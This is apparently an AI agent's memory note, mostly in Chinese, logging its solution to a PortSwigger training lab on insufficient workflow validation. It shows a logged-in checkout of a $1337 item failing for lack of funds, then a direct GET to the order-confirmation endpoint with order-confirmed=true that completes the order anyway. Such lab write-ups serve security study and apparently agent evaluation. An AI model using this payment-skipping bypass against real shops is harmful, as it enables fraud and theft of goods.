---
metadata:
  node_type: memory
name: "PRS arm A lab-logic-flaws-insufficient-workflow-validation"
description: "arm A baseline:lab-logic-flaws-insufficient-workflow-validation 冷实例一次通过 - 直接 GET /cart/order-confirmation?order-confirmed=true 绕过余额校验"
last_updated: 2026-10-08T21:25:48+08:00
created: 2026-10-08T21:25:48+08:00
---

## 2026-10-08 arm A baseline lab-logic-flaws-insufficient-workflow-validation

实例: range_launch 一次超时后重试成功,reused:false(冷实例),base https://0a8200230419ab4c80128070006900f9.web-security-academy.net/,jar /tmp/cj1.json 有效。

链(全走件):
1. page_read 取 widget-lab-id(family 页 → 已剥离 details/script)。
2. range_launch launch <lab_id> --jar /tmp/cj1.json → instance_url。reused:false 故未做 banner_verdict 弃跃迁。
3. http_session get /login 取 csrf → post /login(wiener/peter)→ 302 /my-account?id=wiener。
4. http_session get /product?productId=1:credit $100.00,jacket $1337.00。
5. http_session post /cart(productId=1,redir=PRODUCT,quantity=1)→ 302。
6. http_session post /cart/checkout(csrf)→ 303 Location /cart?err=INSUFFICIENT_FUNDS(正常结账路径被余额挡住)。
7. 绕行:GET /cart/order-confirmation?order-confirmed=true(购物车仍含 jacket)→ 200,page 头 div.academyLabBanner.is-solved,「Congratulations, you solved the lab!」,订单表列 jacket $1337,「Your order is on its way!」。一请求即 congrats。

要点:
- 缺陷=购买流程的后段(order-confirmation)不校验前置支付是否成功;结账 POST 的失败只在 checkout 面,确认面本身任意可取,且购物车内容进入订单。
- 该件(单页确认腿)无需新件:http_session 单发 GET 即可;banner 判定未另跑 banner_verdict(is-solved class 直接可读)。
- 实例复用纪律:本实例 reused:false,归因干净。

